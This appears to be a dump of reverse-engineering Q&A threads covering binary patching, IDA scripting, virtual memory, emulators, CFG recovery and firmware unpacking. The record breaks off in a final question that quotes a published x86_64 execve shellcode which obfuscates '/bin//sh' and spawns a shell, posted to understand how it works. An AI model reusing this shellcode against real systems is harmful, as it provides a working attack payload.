<p>3) No, you can't. At least not reliably. Whichever trick you'd want to use could be intercepted by the tracer. Also, you generally don't want to do this, since you need <code>ptrace</code> to debug your program, and whoever has rights to <code>ptrace</code> you could screw you in various other ways as well. However, a process can't have more than one tracer attached at a time, so you could have a master process that spawns and <code>ptrace</code>s the worker, so noone else can attach to the worker to trace it. Of course, the worker would still need a way to check if it's parent is alive (compare <code>getppid()</code> with 1 for example) and that the tracer isn't intercepting your <code>getppid()</code> calls and patching them to return the old parent id.</p>
","8532"
"Using GDB to modify an executable","1134","","<p>I'm working on an assignment for a systems programming class, and for extra credit we are asked to modify an executable to allow it to accept the reverse of our PIN (finding the PIN was the original assignment). I was able to use GDB to change the memory values being stored for the PIN to the reverse, and when I run the program it works as intended. The only issue is that I can't save these changes to the executable. Once I exit the debugger it reverts to normal. I've tried using ""set write on"" and ""gdb -write "" before making changes, but the changes still wouldn't stick. Does anyone know if what I'm tyring to do is even possible, or where I might be going wrong?</p>
","<p>Did you remember to reload your program after <code>set write on</code> ?</p>

<p>And did you load your (writable) copy of the original program (as opposed to the professor's copy in a shared location that everyone has read access to, but noone can write) ?</p>

<p>Actually, i've never used gdb to patch files directly, i normally use a hex editor.</p>

<p>If you don't have a hex editor on your system, maybe you have <code>xxd</code>, which allows you to turn a binary into a hex dump and vice versa.</p>

<p>If all else fails, you can still do something like</p>

<pre><code>echo 'X' | dd of=binary.file bs=1 seek=12345 count=1
</code></pre>

<p>to patch the byte at offset 12345 in your file to an X. This method has the advantage that it doesn't depend on any gnu utilities, so it works on most variants of unix.</p>
","8201"
"How to extract .dfm file from a delphi executable?","1132","","<p>Is it possible to retrieve .dfm file from a delphi executable. I have inherited Acrobyte projects(Indy Pity Crew) so before I reactivate the website(www.acrobyte.cf) every product must be in order. I have updated others except the three left. So since I have a software that converts .dfm to .pas I can update them. I have seen the software that extracts DFM data from a delphi executable, in form of .rc and .dat but I never been able to add a function that extract the whole DFM file.</p>

<p>How can I extract the whole dfm file of an executable e.g( pet.exe to pet.dfm)?</p>

<p>In other ways I would like to convert rc file to dfm.</p>

<p>Thanks in advance</p>
","<p><a href=""http://kpnc.org/idr32/en/"" rel=""nofollow"">Interactive Delphi Reconstructor</a>, <a href=""http://www.woodmann.com/collaborative/tools/index.php/DeDe"" rel=""nofollow"">DeDe</a>, and <a href=""http://www.woodmann.com/collaborative/tools/index.php/DE_Decompiler"" rel=""nofollow"">DE Decompiler</a> can all be used to extract DFMs from Delphi EXEs.</p>
","11016"
"Virtual address translation in assembly language","1129","","<p>While running <code>notepad.exe</code> in Ollydbg, I got the following execution trace:</p>

<pre><code>(CPU)
...
[0x00C73689] CALL notepad.0073053
[0x00C7369E] PUSH 58
...

(Memory Map)    
Address    Size     Owner    Section  Contains      Type  Access   Initial  Mapped as
...
000FD000   00002000                                 Priv  RW       Guar     RW
000FF000   00011000                   stack of mai  Priv  RW       Guar     RW
...
00A90000   00001000                                 Priv  RW                RW
00C70000   00001000 notepad           PE header     Imag  R                 RWE
00C71000   0000B000 notepad  .text    code,imports  Imag  R                 RWE
...
</code></pre>

<p>Under the virtual address system of windows operation system,</p>

<p>Some address is not in the physical memory or RAM,</p>

<ol>
<li><p>Who will translate <code>CALL notepad.0073053</code> to <code>CALL [Real address 0x??????]</code>?</p></li>
<li><p>When that address is file mapped, who will read that value from the disk in assembly language ?</p></li>
</ol>
","<p>You're talking about memory virtualization, which, unless you're developing an operating system, is nothing you have to care about, since it's transparent to user processes.</p>

<p>It's true that the address your program sees, notepad.0073053, is not the same as the one that is physically on the hardware address pins on the processor. But, when the processor executes the call instruction, it doesn't translate the destination address by some magic and puts this translated addres into the program counter - the program counter will. after the call, hold 0x007353.</p>

<p>The virtualization is done in the memory management unit (MMU), which you can think of as a separate piece of hardware between the actual processor and the ram. (Of course, they are on the same chip in modern processors, but there used to be separate MMUs long ago). Think of it this way:</p>

<pre><code>+-----------------+           +----------------------+          +-----------------+
| CPU             |           | MMU lookup table     |          | RAM             |
+-----------------+           +----------------------+          +-----------------+
| call 73053      |  73053    | virtual      | phys. | 63053    |00000            |
| access 73053 on |----------&gt;| 10000-20000  | a0000 |---------&gt;|10000            |
| the address bus |           | 40000-50000  | 30000 |          |20000            |
+-----------------+           | 70000-80000  | 60000 |          |30000            |
                              +----------------------+          |40000            |
                                                                |50000            |
                                                                |60000    X       |
                                                                |70000            |
                                                                |80000            |
                                                                +-----------------+  
</code></pre>

<p>The MMU contains a lookup table - which virtual address range maps to which physical addres range. Whenever the processor accesses memory, it tells the mmu which virtual address to access; the MMU uses its lookup table to determine the actual physical address, and that's what it puts on the address bus. But, the processor doesn't care about this translation. What you see in Ollydbg is always the virtual address, never the physical one.</p>

<p>The MMU entries are handled inside the operating system, which may rearrange them as it sees fit. For example, the OS may decide to need the RAM block at 60000 for something else, copy the block at 60000 to, for example, 20000, and update the MMU table. Your program won't notice anything of that - it still accesses the same virtual memory location, which is now at a different place in physical memory.</p>

<pre><code>+-----------------+           +----------------------+          +-----------------+
| CPU             |           | MMU lookup table     |          | RAM             |
+-----------------+           +----------------------+          +-----------------+
| call 73053      |  73053    | virtual      | phys. | 23053    |00000            |
| access 73053 on |----------&gt;| 10000-20000  | a0000 |---------&gt;|10000            |
| the address bus |           | 40000-50000  | 30000 |          |20000    X       |
+-----------------+           | 70000-80000  | 20000 |          |30000            |
                              +----------------------+          |40000            |
                                                                |50000            |
                                                                |60000            |
                                                                |70000            |
                                                                |80000            |
                                                                +-----------------+  
</code></pre>

<p>If the operating system decides to page out a memory block to disk, it will clear the corresponding MMU entry. Now, when the processor tries to access that virtual memory, the MMU will generate a <code>page fault</code>, which tells the processor it can't access the memory.</p>

<pre><code>+-----------------+           +----------------------+          +-----------------+
| CPU             |           | MMU lookup table     |          | RAM             |
+-----------------+  73053    +----------------------+          +-----------------+
| call 73053      |----------&gt;| virtual      | phys. |          |00000            |
| access 73053 on |           | 10000-20000  | a0000 |          |10000            |
| the address bus | fault!    | 40000-50000  | 30000 |          |20000            |
+-----------------+&lt;----------| 90000-a0000  | 40000 |          |30000            |
                              +----------------------+          |40000            |
                                                                |50000            |
                                                                |60000            |
                                                                |70000            |
                                                                |80000            |
                                                                +-----------------+
</code></pre>

<p>This page fault will make the processor call the page fault handler within the operating system. The OS keeps a list of which pages it has written to disk, finds a memory location that's currently unused, reads the required page from disk to that location, updates the MMU accordingly, then returns to the user program and re-executes the instruction that generated the page fault. The user program won't know anything about that (unless it tries hard to find out, for example by measuring the real time needed and comparing that to the expected time). In Windows, <code>perfmon</code>s <code>Ram/Page faults per second</code> counter will tell you how often that happened.</p>

<p>(Actually, there are different kinds of page faults. Space in the MMU tables is quite limited, it normally doesn't map all of a user program's virtual addresses. When a page fault occurs, the OS first checks ""Is that block of memory in RAM somewhere, with only the MMU entry missing?"". If yes, the OS just generates the MMU entry and allows the program to continue. This is called a minor page fault, which is quite fast to handle; page faults that actually access the disk are called major page faults, and impact performance much more).</p>
","5913"
"Treating independent code as a function in IDA Pro","1128","","<p>When reverse engineering programs, I often find functions like the one below.  This function in particular has a set of nested if/else blocks (pink boxes) which would typically be fairly easy to follow. When code executes at the blue box however, the code becomes messy and can take either of two independent code paths (purple or yellow).  If the developer had used a function (or not used an inline function) for the purple or yellow code blocks, this code would be much easier to reverse engineer. As a function, I can rename and comment on the code block, and the overall program becomes easier to read.</p>

<p>My usual technique when I come across this kind of function is to apply colors to the code blocks like you see in the graph below. Is there a way for IDA to treat an arbitrary collection of code blocks as a function that is not called and/or are there better approaches to dealing with inline code and independent code blocks?</p>

<p><img src=""https://i.stack.imgur.com/kmK4c.png"" alt=""Large function""></p>
","<p>It sounds like what you need is node groups. Since the very first implementation (5.0) IDA's graph view allowed to group several nodes into one ""super-node"" with a custom title. Just select the nodes you want to group with Ctrl-click and choose ""Group nodes"" from the context menu.</p>

<p>For more info, see ""Graph node groups"" in IDA's help or <a href=""https://www.hex-rays.com/products/ida/support/idadoc/1129.shtml"">online</a>.</p>
","307"
"automatically find and nop an instruction in IDA","1122","","<p>These are my first steps in IDA script, so please be kind.</p>

<p>I want to create some sort of script that, every time it finds the following instruction:</p>

<p><code>MOV R1, #0x4D080</code></p>

<p>to automatically replace it with</p>

<p><code>NOP</code></p>

<p>I could do it statically (hex edit), but I'm looking for a way to do it on the fly during dynamic debugging.</p>

<p>Any ideas?</p>
","<p>Actually you can do the following:</p>

<p>Assuming that you know when and where this instruction is located and where it can appear:</p>

<pre><code>#I didn't check this code, use carefully, beware errors
#You can use idc.FindBinary instead of text search if you know 
#how your assembly instruction is encoded
import idautils
import idc


#static nopification of ARM address
def static_nopify_arm(ea):
    nop = [0xe1, 0xa0, 0x00, 0x00]  # it is a nop encoding taken from wikipedia
    for i in range(len(nop)):
        idc.PatchByte(ea + i, nop[i])


#searches assembly command by its text
#generally bad idea, but should work
#start and end means search area boundaries
def static_search_text_and_nopify(asmline, start, end):
    for h in idautils.Heads(start, end):
        disasm = idc.GetDisasm(h)
        if asmline == disasm:
            static_nopify_arm(h)


#The same with dynamic (memory during debugging)
#Dynamic nopification of ARM address
def dynamic_nopify_arm(ea):
    nop = [0xe1, 0xa0, 0x00, 0x00]  # it is a nop encoding taken from wikipedia
    for i in range(len(nop)):
        #I'm not sure that it will work, may be you should do something with memory protection
        idc.PatchDbgByte(ea + i, nop[i])


#searches assembly command by its text
#generally bad idea, but should work
#start and end means search area boundaries
#Code should be recognized by IDA as code before running the function
def dynamic_search_text_and_nopify(asmline, start, end):
    for h in idautils.Heads(start, end):
        disasm = idc.GetDisasm(h)
        if asmline == disasm:
            dynamic_nopify_arm(h)
</code></pre>
","3805"
"Question about LEA instruction","1122","","<p>i'm learning to reverse engineer. So i'm coding some programs and try to understand their assembly.
I stumbled upon a curious case and i think i can't solve it alone.</p>

<p>Here's the c code:</p>

<pre><code> #include &lt;stdio.h&gt;

int main(){

char *texto = ""O numero e %d\n"";
int i = 10;

while(i){
    printf(texto, i--);
}

return 0;
}
</code></pre>

<p>The assembly produced by IDA is the following:</p>

<pre><code>mov     eax, [esp+28]
lea     edx, [eax-1] ; The part i don't understand
mov     [esp+28], edx
mov     [esp+4], eax
mov     eax, [esp+18h]
mov     [esp], eax      ; char *
call    _printf
</code></pre>

<p>What i could understand is that it stores the old value in eax and pushes to stack(I purposedly didn't turn on optimizations) and then it pushes the format.
While that happens in the middle it does the <code>i--</code>, but i can't understand how it's working. So it get's the address of <code>eax-1</code> and stores in <code>edx</code> and then stores it in <code>i</code>, but <code>eax</code>doesn't hold an address but a value.</p>

<p>Thanks in advance.</p>
","<p>What you're seeing is an efficiency trick that compilers like to use.</p>

<p>Internally, the CPU doesn't make a difference between numbers and addresses - 32 bit integers and pointers are the same thing. (Or 64 bit, if you're using newer architecture, but as your register names start with <code>e</code>, you're using 32 bit).</p>

<p>The <code>lea</code> instruction loads the address of its operand, instead of the operand itself. In C terms, you could look at [eax-1] as *(eax-1), and <code>lea</code> adds a <code>&amp;</code> operator to that, so <code>lea edx, [eax-1]</code> is like <code>edx = &amp;(*(eax-1))</code>. Which is the same as <code>eax-1</code> of course.</p>

<p>The compiler could have done exactly the same using the instruction sequence <code>mov edx, eax; sub edx, 1</code> or <code>mov edx, eax; dec edx</code>. So, why did it use the <code>lea</code> instruction?</p>

<p>The answer is that, historically, resolving addresses in <code>lea</code> was done using dedicated address bus hardware and bypassed the ALU. Also, pipelining had its issues when the same register was used twice in subsequent operations. Which means, on <strong>older</strong> processors, using <code>lea</code> was a few cycles faster than the alternatives, and it's not hard to implement in the compiler, so this is what compilers traditionally did.</p>

<p>On new processors, the distinction ""<code>lea</code> uses separate hardware"" isn't (neccesarily) made any more, and pipelining is a lot more intelligent than it used to be, so i doubt it's make any difference these days. But it's still in the compilers, and won't get removed from them because there's just no good reason to.</p>
","12302"
"Unicorn and QEMU: Example use cases to understand the differences","1122","","<p>The Unicorn <a href=""http://www.unicorn-engine.org/docs/beyond_qemu.html"" rel=""nofollow"">website</a> lists some differences between Unicorn and QEMU, especially those differences ""where Unicorn shines"".</p>

<p>They furthermore write:</p>

<blockquote>
  <p>A notable difference between Unicorn and QEMU is that we only focus on emulating CPU operations, but do not handle other parts of computer machine like QEMU.</p>
  
  <p>[...] we stripped all the subsystems that do not involve in CPU emulation.</p>
</blockquote>

<p>I am trying to understand what this actually means, i.e. when to choose QEMU and when Unicorn. Especially, what are concrete example use cases (in the area of reverse engineering) in which Unicorn*) cannot be used, but QEMU can ?</p>

<p>*) or any tools based on Unicorn such as <a href=""https://github.com/lunixbochs/usercorn"" rel=""nofollow"">usercorn</a></p>
","<h2>What does ""<em>(not) emulating hardware other than the CPU</em>"" mean?</h2>

<p>This means that whenever the software being emulated accesses hardware, it won't work in Unicorn in the same way as on actual hardware.</p>

<p>We have several questions about emulating firmware on QEMU. The general answer is that, when you try booting a firmware kernel in QEMU, that kernel will access some I/O ports, but in the emulated environment, those I/O ports won't react in the way they should. For example, an input bit that signals ""device ready"" will be stuck in one state, instead of toggling between true and false.</p>

<p>To make your software work as intended, you need to emulate this hardware as well - for example, your emulator needs to know something like: </p>

<blockquote>
  <p>Bit 3 of the input port at <code>0x124</code> is the ""<em>ready</em>"" bit, when it's set to <code>1</code>, there's one byte of serial input waiting at port <code>0x125</code>. Reading port <code>0x125</code> will reset the ready bit to <code>0</code>, and it will stay in state <code>0</code> until the next byte arrives on the serial line.</p>
</blockquote>

<p>And if you want to emulate how a software reacts on some particular input on the serial interface, you'll have to build on that specification and make the emulator provide your input at these I/O ports.</p>

<p>But of course, you need information about the hardware first, so this isn't very useful to reverse engineering. It may be useful to the hardware designer though to find some bugs that are difficult to reproduce or monitor on actual hardware.</p>

<p>As a specific example, consider the <a href=""https://en.wikipedia.org/wiki/A20_line"" rel=""nofollow noreferrer"">A20 gate</a> on 16/32 bit PCs. Indeed, the same instructions:</p>

<pre><code>mov ax,0ffffh
mov es,ax
mov ax,es:[01234h]
</code></pre>

<p>May access different memory depending on some bits you wrote to the keyboard controller. You can't get this right in an emulator unless you emulate hardware as well.</p>

<h2>When is QEMU more useful?</h2>

<p>Mostly for not RE-related tasks.</p>

<p>If you want to emulate an old MS DOS program, you'd need QEMU, just because those programs did so much hardware manipulation themselves as the OS lacked the APIs. (Of course, in this case <a href=""https://www.dosbox.com/"" rel=""nofollow noreferrer"">DOSBox</a> would probably be more suited than QEMU).</p>

<p>Or, if you want to make an emulator for a Gameboy, C64, or just any other kind of vintage hardware, you need to simulate the hardware as well, so you'd need these QEMU features.</p>

<h2>When is Unicorn more useful?</h2>

<p>For RE tasks, you typically don't need hardware emulation, because you don't have access to hardware design documents anyway. So, an emulator that omits these parts of QEMU, and improves other parts, is probably more suited to RE than QEMU is. Especially the ""<em>does not need an environment</em>"" part can make stuff easier. </p>

<p>As a concrete example, take one of those ""<em>do my homework for me</em>"" questions - <a href=""https://reverseengineering.stackexchange.com/questions/12534/translate-the-assembly-code-to-c-code"">this</a>, and <a href=""https://reverseengineering.stackexchange.com/questions/12530/how-to-convert-assembly-to-c-code"">this</a>. When you have an assumption what a function does, you may want to run it to check if some specific input produces the output you assume. With QEMU, you need to compile this to an ELF file, and set up an operating system to run your program; with Unicorn, it seems like you can run the snippet directly (of course you still have to assemble it, and need to initialize registers in a sensible way, but you don't need all the rest of the bloat).</p>

<p>Or, another example, you have a program that deals with DRM protected data, and includes some functions to decrypt the DRM. If that program runs on ARM Android or I/OS, and you want to have your PC do the decryption, you can try loading the program into memory and tell your emulator ""<em>start emulating at address <code>0x12345678</code></em>"". It seems to be much easier to do this if you don't have to provide all the environment, and dependencies, that QEMU requires.</p>
","12541"
"Control flow graph reconstruction projects","1121","","<p>I'm looking for projects providing reconstructed Control Flow Graphs from binaries while supporting more than one platform (e.g. x86, x64, arm). For example, considering this short assembler program:</p>

<pre><code>.global main
.intel_syntax noprefix

.extern getchar
.extern printf

.section .data
jmpTable:
    .long _stub0
    .long _stub1
    .long _stub2
fmt: .asciz ""%x\n""


.section .text

main:
    call getchar
    mov dl, 4
    imul dl
    add eax, offset jmpTable
    jmp [eax]
    .long 3851
_stub0:
    mov eax, 0
    jmp end
    .long 3851
_stub1:
    mov eax, 1
    jmp end
    .long 3851
_stub2:
    mov eax, 2
    jmp end
    .long 3851
end:
    push eax
    push offset fmt
    call printf
    add esp, 8
    ret
</code></pre>

<p>Projects I've considered:</p>

<ul>
<li>IDA (best so far, extraction painful)</li>
<li>BARF (naive, limited approach)</li>
<li>Angr (breaks easily or computes forever)</li>
<li>Radare2 (is there any api to export cfg data?)</li>
<li>JakStab (limited to x86)</li>
</ul>

<p>rather obvious choice, still, exporting a interprocedural CFG is still a pain. Also, although it is able to find all basic blocks of this example, it misses all indirect edges.</p>

<p>The projects should offer come kind of API to provide the cfg. I know solving this problem with static-analysis alone may be infeasible. I'm looking for a best-effort approach.</p>
","<p>For now, the most efficient approaches in practice seems to follow the principle of <a href=""https://en.wikipedia.org/wiki/Symbolic_execution"" rel=""nofollow"">symbolic execution</a>. This technique, originally developed to automatically build-up a set of test cases based on a given source code, has been recently used in binary analysis to discover and (partially) recover the CFG of the analyzed binary program.</p>

<p>Most of the time, if you want to deal with several assembly languages, you need to use an intermediate representation for the programs. For now, there have been a lot of these generic models and none did really got the supremacy over the others. Yet, the most populars seems to be the intermediate representation of LLVM (many tools use it), the second most popular seems to be VEX, the intermediate representation used in Valgrind (as used in Angr). The one from QEMU or the language RREIL might also be an option, but they are less commonly used. But, most of the projects come with their own intermediate representation.</p>

<p>Then, what you need to build up a CFG-recovery program based on symbolic execution are the following modules:</p>

<ul>
<li><p><strong>Loader</strong>: This module is in charge to take your binary program (it may be an executable or a library) and simulate the work of the native loader to build a realistic memory image of what you get after the loading process has been achieved.</p></li>
<li><p><strong>Decoder</strong>: This module is in charge of translating the native assembly found while symbolically executing the program into your own intermediate representation. It is a quite lengthy (and painful) piece of code to implement! So, be prepared to suffer while doing this.</p></li>
<li><p><strong>Symbolic execution engine</strong>: Usually based on an SMT-solver using the logic QF_AUFBV (Quantifier Free / Arrays / Uninterpreted Function / Bitvectors), the symbolic execution engine can really be a performance bottleneck if you code it naively because the recovery of the CFG will use it a lot. Here, having a good formula simplification (or slicing) module is really the key.</p></li>
</ul>

<p>Apart from these three modules, you might also improve your tools by adding more advanced analysis and start coding an abstract interpretation framework that can be added on the top of your intermediate representation, just to have chance to unveil some parts of the CFG that cannot be discovered just through the power of the SMT-solvers. </p>

<p>Also, performance is really the key to make your tools really usable. So, be able to capture the exact scope of a variable or the ability to detect a function or a module/object in the binary code helps a lot to reduce the size of the code you have to consider at once.</p>

<p>Now, I could give you a lot of pointers and articles about this topic, but I lack a bit of time. I might come back to finish writing an extensive list later on, but the general idea has been, hopefully, given above. Hope this might help you.</p>
","13412"
"Rename obfuscated names with .NET Reflector?","1112","","<p>I have some obfuscated C# .NET code I want to analyze.</p>

<p><img src=""https://i.stack.imgur.com/SNylK.png"" alt=""obfuscated C# code""></p>

<p>Is it possible to rename those obfuscated symbols? So I can more easily track them? Like IDA Pro can work with renaming functions and so forth.</p>
","<p>Some plugins like <a href=""http://reflexil.net/"">reflexil</a> provide this functionality.</p>
","3106"
"Are there any free or low cost disassemblers for the Renesas H8 family of processors?","1104","","<p>IDA Pro can deal with the Renesas H8 processors, but not the free version.</p>

<p>Are there any free or low cost (&lt;£100) disassemblers for the Renesas H8 family or processors?</p>
","<p>There is an H8 port of GNU binutils (the target is called 'h8300' I believe) which includes <code>objdump</code>. It seems it's even available in Debian in the package <a href=""http://packages.debian.org/sid/binutils-h8300-hms""><code>binutils-h8300-hms</code></a> (might be outdated).</p>

<p>Alternative GNU-based toolchains for many Renesas processors (including H8) are provided by <a href=""http://www.kpitgnutools.com/"">KPIT</a> (free but requires registration). I think they've been contributing to mainline too but not sure how's their progress there.</p>

<p>Just for reference, here's how to use <code>objdump</code> to disassemble a raw binary:</p>

<pre><code>objdump -m h8300 -b binary -D myfile.bin
</code></pre>

<p>Renesas offers their own commercial compiler/assembler/simulator (and I <em>think</em> a disassembler too) suite called <a href=""http://am.renesas.com/products/tools/coding_tools/c_compilers_assemblers/h8_compiler/index.jsp"">High-performance Embedded Workshop</a> (HEW) but I couldn't find out how much it costs. There is a <a href=""http://am.renesas.com/support/downloads/download_results/C2000301-C2000400/evaluation_h8c.jsp"">downloadable evaluation version</a>, however.</p>

<p>For a quick look at some hex you can also try the <a href=""http://www.onlinedisassembler.com/odaweb/run_hex"">Online Disassembler</a>, it has a couple of H8 variants.</p>
","1689"
"How to prevent automatic padding by IDA?","1100","","<p>I defined a struct in a header file, similar to this one:</p>

<pre><code>struct STRUCT
{
    char a;
    int b;
};
</code></pre>

<p>This is parsed successfully by IDA, however it adds padding bytes after the <code>char</code>:</p>

<pre><code>00000000 STRUCT          struc ; (sizeof=0x4)
00000000 a               db ?
00000001                 db ? ; undefined
00000002 b               dw ?
00000004 STRUCT          ends
</code></pre>

<p>I can't remove the padding field using <kbd>u</kbd>, so the question is: How can one remove padding fields automatically inserted by IDA, or how can one prevent IDA from creating padding fields?</p>
","<p>You can use <code>#pragma pack(1)</code> before the declaration.</p>
","2053"
"Adding another section to an idb file","1098","","<p>I'm debugging a process inside a VM via Olly, and occasionally exporting a section dump when needed and loading it on the host system for better analysis.</p>

<p>Right now I'm looking at a dump of a certain code section that's referencing function calls in another, dynamically allocated, section. In the debugger I can of course see all the function calls, but in IDA all I have are calls to immediate addresses that don't exist.</p>

<p>I'd like to be able to dump the referenced section and somehow bluntly attach it to the same .idb so IDA would be able to resolve the references for me.</p>

<p>I couldn't find anything about it on google or when digging around the menus.
Did I miss something or is this impossible or requires an addon? It's also possible for me to write an idapython script that defines and copies the section over, but I don't see any relevant API calls.</p>

<p>Debugging via IDA and taking a full memory snapshot is a solution I'd like to not have to use; I enjoy using olly.</p>
","<p>After loading the main dump into IDA, in IDA's menubar go to <code>File</code> → <code>Load file</code> → <code>Additional binary file...</code>, select the dump of the dynamically allocated memory, and specify the dynamic allocation address as the <code>Loading segment</code>.</p>
","5875"
"Does a Motorola SREC file give me any additional information over a binary ROM image?","1091","","<p>When working with embedded systems, it is often easiest to use a downloadable firmware file rather than recover the firmware from the device.</p>

<p>Mostly these are ROM images in the form of a .bin file. Sometimes, they are Motorola SREC files (often called .s19 files or .mot files). </p>

<p>These are easily converted into bin files using many available tools. The SREC files tend to only contain records where there is actually data/code and the gaps are filled with padding values during conversion. Padding tends to be 0x00 or 0xFF.</p>

<p>This can gives us a hint about the data segment of the image - it allows us to tell if the memory has been initialised with 0x00/0xFF intentionally by the compiler/assembler, or if it is just padding. Sometimes this can make identifying data structures easier.</p>

<p>Is there anything else an SREC file can leak?</p>
","<p>Correct me if I'm wrong, but since SREC is an ASCII representation of the binary data, wouldn't the corresponding binary file also ""leak"" sections of data that are padded with 0x00/0xFF?</p>

<p>With that said, yes, I think that in some cases SREC could expose useful information about the firmware that you wouldn't otherwise get with a binary image, assuming the vendor makes proper use of SREC's record types. Each line of text in an SREC file starts with a record code (S0, S1, S2, etc). Some example record types from <a href=""http://en.wikipedia.org/wiki/SREC_%28file_format%29#Format"" rel=""noreferrer"">Wikipedia's</a> SREC page:</p>

<blockquote>
  <p>The S0 record data sequence contains vendor specific data rather than
  program data. String with file name and possibly version info.</p>
  
  <p>Data sequence, depending on size of address needed. A 16-bit/64K
  system uses S1, 24-bit address uses S2 and full 32-bit uses S3.</p>
  
  <p>The address field of the S7, S8, or S9 records may contain a starting
  address for the program.</p>
</blockquote>

<p>Clearly, an SREC file provides information about the data in each record - information which normally would not be contained in a binary file. If you see an S7/8/9 record for example, you can probably assume that the firmware's entry point is located there. Likewise, the use of S2 vs S3 can tell you if the data contains 24 bit addresses or 32 bit addresses. </p>

<p>How common it is to use these different SREC record types in practice though, I couldn't say. A vendor could probably just mark everything with the same record type (S1 for example), which wouldn't really give you any more information about the data than a binary file would.</p>
","2057"
"Hauwei E586 firmware","1091","","<p>I'm working on unpacking Hauwei E586 MiFi firmware. I downloaded firmware update pack which is available as Windows EXE, then used Hauwei Modem Flasher to unpack real firmware from installer.</p>

<p>I've got 4 files:</p>

<pre><code>01.bin: data
02.bin: ELF 32-bit LSB executable, ARM, version 1, statically linked, not stripped
03.bin: data
04.bin: ELF 32-bit LSB executable, ARM, version 1, statically linked, not stripped
</code></pre>

<p>As we can see <code>02</code> and <code>04</code> are executable files. <code>01</code> is probably some kind of bootloader (I assume it from string analysis). <code>03</code> is some kind of pseudo FS.</p>

<p>I started from analyzing <code>03</code> (I posted it <a href=""http://czlug.icis.pcz.pl/~pbm/03.bin"" rel=""nofollow"">here</a>):</p>

<p>There is header part</p>

<pre><code>02 00 EE EE  50 BA 6E 00  20 00 00 00  D0 A2 02 00
7B 02 00 00  00 00 00 00  00 00 00 00  00 00 00 00
</code></pre>

<p><code>7B 02</code> as 16 bits gives 635 which is number of files in binary (verified using <code>strings</code>). Then there are 635 parts describing each file (call it directory) and at the end there is content of files.</p>

<p>There is directory entry for first GIF file which I found. I choosed GIF because it's easy to identify (there is header GIF8X and footer 0x3B).</p>

<pre><code>77 77 77 5C  75 6D 5C 70  75 62 6C 69  63 5F 73 79
73 2D 72 65  73 6F 75 72  63 65 73 5C  42 75 74 74
75 6E 5F 43  75 72 72 65  6E 74 2E 67  69 66 00 00
lot of zeros
18 22 11 00  10 02 00 00  00 00 00 00  00 00 FF EE
</code></pre>

<p>We can see its name: <code>www\um\public_sys-resources\Buttun_Current.gif</code> and in last line there is offset of file in binary and file size, but I'm not really sure how to interpret this values.</p>

<p>I found first GIF after directory and extracted it manually (from header to footer) which gives me file of size 528 bytes, so reading <code>10 02</code> as 16 bit unsigned gives me that number. I tried to treat <code>18 22</code> as 16 bit unsigned to get offset, but it was different from offset that I manually read from file. Bu there was constant difference between offset and real offset of file of <code>1286864</code>. So I created script for unpacking this binary (I'm getting offset and adding to it <code>1286864</code>).</p>

<p>Script worked only partially. It recreated directory structure, but was able only to extract files in one particular directory (directory with GIF which I was using as reference). After check on different part of file it seems that offset of offset in different subdirectories is another that in this GIF directory. So, my guess is that I'm interpreting offset wrong (but treating it as 32 bits gives nothing useful).</p>

<p>There is unpack script:</p>

<pre><code>import sys, struct, os

def main(args):
    outdir = args[1]
    f = open(args[0], 'rb')
    f2 = open(args[0], 'rb')
    header = f.read(32)
    print(len(header[16:]))
    number_of_files = struct.unpack(""h"", header[16:18])[0]
    print(number_of_files)

    for i in range(number_of_files):
        body = f.read(272)
        file_, rest = body.split(b'\x00', 1)
        offset = struct.unpack(""H"", body[256:258])[0] + 1286864
        size = struct.unpack(""H"", body[260:262])[0]
        file_ = file_.decode(encoding='UTF-8').replace('\\', '/')
        dirname = os.path.join(outdir, os.path.dirname(file_))
        filename = os.path.basename(file_)
        print(filename, size, offset, dirname)
        try:
            os.makedirs(dirname)
        except OSError:
            pass

        outfile = open(os.path.join(dirname, filename), ""wb"")
        f2.seek(offset)
        outfile.write(f2.read(size))
        outfile.close()

if __name__=='__main__':
    sys.exit(main(sys.argv[1:]))
</code></pre>

<p>Usage: <code>./script.py 03.bin output_directory</code></p>

<p>So my question is: what I'm doing wrong? Maybe I should read some another data type as offset/size? Which one?</p>
","<p>I managed to solve problem.</p>

<p>First file in directory is <code>ZSP.bin</code>. It doesn't matter if offset of this file is 16 or 32 bit because in both cases is 0. As I know where directory ends and first file after directory should be ZSP.bin.</p>

<p>Below there is last two lines of last directory entry and first line of which I suspected should be <code>ZSP.bin</code>.</p>

<pre><code>00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00 
FC 94 6D 00  53 25 01 00  00 00 00 00  00 00 FF EE
11 00 10 00  30 00 00 00  10 00 00 00  00 00 00 00
</code></pre>

<p>Each directory entry ends with <code>FF EE</code>, so I checked offset of next byte and assumed that it will be begin of <code>ZSP.bin</code>. Offset of it was <code>0x2a2d0</code>. Then I checked size of <code>ZSP.bin</code>.</p>

<p>I know that where it is, but I didn't know if it is 16 bits or 32 bits (<code>B4 C3</code> or <code>B4 C3 0C 00</code>). When I added <code>B4 C3</code> as 16 bits unsigned to my known offset <code>0x2a2d0</code> I landed at address <code>0x36684</code> which doesn't look like beginning of XML file (which is third in directory, but second one have 0 length). So I tried adding <code>0xcc3b4</code> (32 bits value) to my offset, which gives me <code>0xf6684</code> and at this address there was beginning of XML file... :)</p>

<p>So I modified my code:</p>

<pre><code>offset = struct.unpack(""I"", body[256:260])[0] + 172752
size = struct.unpack(""I"", body[260:264])[0]
</code></pre>

<p>After manual check of some random not binary files all of them were ok (proper begins and ends of HTML and XML, GIFs identified as GIFs)...</p>

<p>BTW, idea of checking first file in directory not this GIFs was first thought that got to my mind after I woke up... :)</p>
","2767"
"What do the 20 lines of executable code in this exploit do?","1091","","<p>I stumbled upon this 31 bytes of <a href=""https://www.exploit-db.com/exploits/38815/"">Linux x86_64 Polymorphic execve Shellcode</a>, posted by the author ""d4sh&amp;r"":</p>

<p>The code seems to be a combination of assembly and C and looks like this:</p>

<pre><code>/*
;Title: polymorphic execve shellcode
;Author: d4sh&amp;r
;Contact: https://mx.linkedin.com/in/d4v1dvc
;Category: Shellcode
;Architecture:linux x86_64
;SLAE64-1379
;Description:
;Polymorphic shellcode in 31 bytes to get a shell 
;Tested on : Linux kali64 3.18.0-kali3-amd64 #1 SMP Debian 3.18.6-1~kali2 x86_64 GNU/Linux

;Compilation and execution
;nasm -felf64 shell.nasm -o shell.o
;ld shell.o -o shell
;./shell

global _start

_start:
    mul esi
    push rdx
    mov al,1                         
    mov rbx, 0xd2c45ed0e65e5edc ;/bin//sh 
    rol rbx,24
    shr rbx,1
    push rbx
    lea rdi, [rsp] ;address of /bin//sh
    add al,58
    syscall

*/
#include&lt;stdio.h&gt;
